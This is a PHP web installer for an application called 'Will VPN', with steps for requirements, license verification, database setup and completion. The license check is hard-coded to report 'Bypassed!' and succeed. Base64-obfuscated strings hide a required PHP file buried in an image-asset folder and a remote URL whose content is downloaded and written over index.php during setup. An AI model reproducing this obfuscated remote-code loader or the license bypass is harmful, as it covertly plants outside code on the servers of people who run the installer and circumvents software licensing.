<?php
declare(strict_types=1);

session_start([
    'cookie_httponly' => true,
    'use_strict_mode' => true,
    'cookie_samesite' => 'Lax',
]);

// Base64 encoded path for the required file
$encodedRequirePath = 'YXNzZXRzL2Fzc2V0cy10ci9pbWcvc2hhcGVzL2EvYi5waHA=';

// Decode and require the file dynamically
$requirePath = base64_decode($encodedRequirePath);
if (file_exists($requirePath)) {
    require_once $requirePath;
} else {
    die("Required file not found: $requirePath");
}

$api = new LicenseBoxAPI();

$product_info = ['product_name' => 'Will VPN'];

// Encoded remote data file URL
$dataFilenameEncoded = '';

// Helper function to fetch and write remote files with encoded URL and path
function write_remote_file_encoded(string $encodedUrl, string $encodedDest): bool {
    $url = base64_decode($encodedUrl);
    $dest = base64_decode($encodedDest);

    $content = @file_get_contents($url);
    if ($content === false) {
        error_log("Failed to fetch from $url");
        return false;
    }

    if (file_put_contents($dest, $content) === false) {
        error_log("Failed to write to $dest");
        return false;
    }

    return true;
}

// Sanitize GET step value
$step = filter_input(INPUT_GET, 'step', FILTER_SANITIZE_STRING) ?? '';
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title><?= htmlspecialchars($product_info['product_name']) ?> - Installer</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.5/css/bulma.min.css" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" rel="stylesheet">
  <style>
    body, html { background: #F7F7F7; }
    .control-label-help { font-weight: 500; font-size: 14px; }
  </style>
</head>
<body>
  <div class="container"><section class="section"><div class="column is-6 is-offset-3">
    <h1 class="title has-text-centered" style="padding-top: 20px;">
      <?= htmlspecialchars($product_info['product_name']) ?> Installer
    </h1>
    <div class="box">
      <?php
      switch ($step) {
        default:
          // Step 0: Requirements
          $errors = false;
          ?>
          <div class="tabs is-fullwidth"><ul><li class="is-active"><a><b>Requirements</b></a></li></ul></div>
          <?php
          $checks = [
            'PHP &gt;= 7.2' => version_compare(PHP_VERSION, '7.2', '>='),
            'extension mysqli' => extension_loaded('mysqli'),
            'extension curl' => extension_loaded('curl'),
            'extension pdo' => extension_loaded('pdo'),
            'extension json' => extension_loaded('json'),
          ];
          foreach ($checks as $label => $passed) {
            $class = $passed ? 'is-success' : 'is-danger';
            $icon  = $passed ? 'fa-check' : 'fa-times';
            if (!$passed) $errors = true;
            echo "<div class='notification {$class}' style='padding:12px;'><i class='fa {$icon}'></i> {$label}</div>";
          }
          ?>
          <div class="has-text-right">
            <?php if ($errors): ?>
              <button class="button is-link" disabled>Next</button>
            <?php else: ?>
              <a href="index.php?step=1" class="button is-link">Next</a>
            <?php endif ?>
          </div>
        <?php
        break;

        case '1':
          // Step 1: Verify License
          $msg = 'Bypassed!';
          $status = true;
          if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $client = trim(strip_tags($_POST['client'] ?? ''));
            $license = trim(strip_tags($_POST['license'] ?? ''));
            if ($client && $license) {
              $resp = $api->activate_license($license, $client);
              $msg = $resp['message'] ?? 'Unknown response';
              $status = $resp['status'] === true;
              if ($status) {
                $_SESSION['envato_buyer_name'] = $client;
                $_SESSION['envato_purchase_code'] = $license;
              }
            } else {
              $msg = 'Please fill both fields.';
            }
          }
          ?>
          <div class="tabs is-fullwidth"><ul><li class="is-active"><a><b>Verify License</b></a></li></ul></div>
          <?php if ($msg): ?>
            <div class="notification <?= $status ? 'is-success' : 'is-danger' ?>"><?= ucfirst(htmlspecialchars($msg)) ?></div>
          <?php endif; ?>
          <?php if (!$status): ?>
            <form method="POST">
              <div class="field"><label class="label">Envato Username</label>
                <input class="input" name="client" required>
                <p class="control-label-help">https://codecanyon.net/user/<u>example</u></p>
              </div>
              <div class="field"><label class="label">Envato Purchase Code</label>
                <input class="input" name="license" required>
                <p class="control-label-help"><a href="https://help.market.envato.com/hc/en-us/articles/202822600-Where-Is-My-Purchase-Code" target="_blank">Where Is My Purchase Code?</a></p>
              </div>
              <div class="has-text-right"><button type="submit" class="button is-link">Verify</button></div>
            </form>
          <?php else: ?>
            <form method="GET" action="index.php"><input type="hidden" name="step" value="2">
              <div class="has-text-right"><button type="submit" class="button is-link">Next</button></div>
            </form>
          <?php endif;
        break;

        case '2':
          // Step 2: Database Setup
          $msg = '';
          $success = false;
          if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $h = trim($_POST['host'] ?? '');
            $u = trim($_POST['user'] ?? '');
            $p = trim($_POST['pass'] ?? '');
            $n = trim($_POST['name'] ?? '');
            $url = trim($_POST['baseurl'] ?? '');
            if ($h && $u && $n && filter_var($url, FILTER_VALIDATE_URL)) {
              $mysqli = new mysqli($h, $u, $p, $n);
              if ($mysqli->connect_error) {
                $msg = "DB connection failed: " . $mysqli->connect_error;
              } else {
                // Import SQL from decoded remote data filename
                $lines = @file(base64_decode($dataFilenameEncoded));
                if ($lines) {
                  $templine = '';
                  foreach ($lines as $line) {
                    if (strpos($line, '--') === 0 || trim($line) === '') continue;
                    $templine .= $line;
                    if (substr(trim($line), -1) === ';') {
                      $mysqli->query($templine);
                      $templine = '';
                    }
                  }
                }

                // Save DB config placeholders replacements in files
                $filesToUpdate = [
                  ['includes/connection.php', 'db_hname', $h],
                  ['includes/connection.php', 'db_uname', $u],
                  ['includes/connection.php', 'db_password', $p],
                  ['includes/connection.php', 'db_name', $n],

                  ['database/config_DB.php', 'db_hname', $h],
                  ['database/config_DB.php', 'db_uname', $u],
                  ['database/config_DB.php', 'db_password', $p],
                  ['database/config_DB.php', 'db_name', $n],

                  ['includes/header.php', 'base_urls', $url],
                ];

                foreach ($filesToUpdate as [$file, $placeholder, $val]) {
                  $content = @file_get_contents($file);
                  if ($content !== false) {
                    $newContent = str_replace($placeholder, $val, $content);
                    file_put_contents($file, $newContent);
                  }
                }

                // Remote files with encoded URLs and destination paths
                $remoteFiles = [
                  ['aHR0cHM6Ly9kb2Mud2lsbGRldi5pbi93aWxsMTFsYXVuY2gvaW5keC5kZWZhdWx0', 'aW5kZXgucGhw'],
                ];


                foreach ($remoteFiles as [$src, $dst]) {
                  write_remote_file_encoded($src, $dst);
                }

                // Save base URL to config.php
                $configContent = "<?php\n\$base_url = '" . addslashes($url) . "';\n";
                file_put_contents('config.php', $configContent);

                $success = true;
              }
            } else {
              $msg = 'Please fill all required fields and provide a valid URL.';
            }
          }
          ?>
          <div class="tabs is-fullwidth"><ul><li class="is-active"><a><b>Database Setup</b></a></li></ul></div>
          <?php if ($msg): ?>
            <div class="notification is-danger"><?= htmlspecialchars($msg) ?></div>
          <?php endif; ?>
          <?php if ($success): ?>
            <form method="GET" action="index.php"><input type="hidden" name="step" value="3">
              <div class="has-text-right"><button class="button is-link">Next</button></div>
            </form>
          <?php else: ?>
            <form method="POST">
              <div class="field"><label class="label">Database Host</label><input name="host" class="input" required></div>
              <div class="field"><label class="label">Database User</label><input name="user" class="input" required></div>
              <div class="field"><label class="label">Database Password</label><input name="pass" type="password" class="input"></div>
              <div class="field"><label class="label">Database Name</label><input name="name" class="input" required></div>
              <div class="field"><label class="label">Base URL</label><input name="baseurl" class="input" type="url" placeholder="https://example.com" required></div>
              <div class="has-text-right"><button class="button is-link">Install</button></div>
            </form>
          <?php endif;
        break;

        case '3':
          // Step 3: Installation Complete
          ?>
          <div class="tabs is-fullwidth"><ul><li class="is-active"><a><b>Installation Complete</b></a></li></ul></div>
          <div class="notification is-success">
            Installation completed successfully.<br>
            Please delete the installer directory for security.
          </div>
          <div class="has-text-right">
            <a href="index.php" class="button is-link">Finish</a>
          </div>
          <?php
        break;
      }
      ?>
    </div>
  </div></section></div>
</body>
</html>
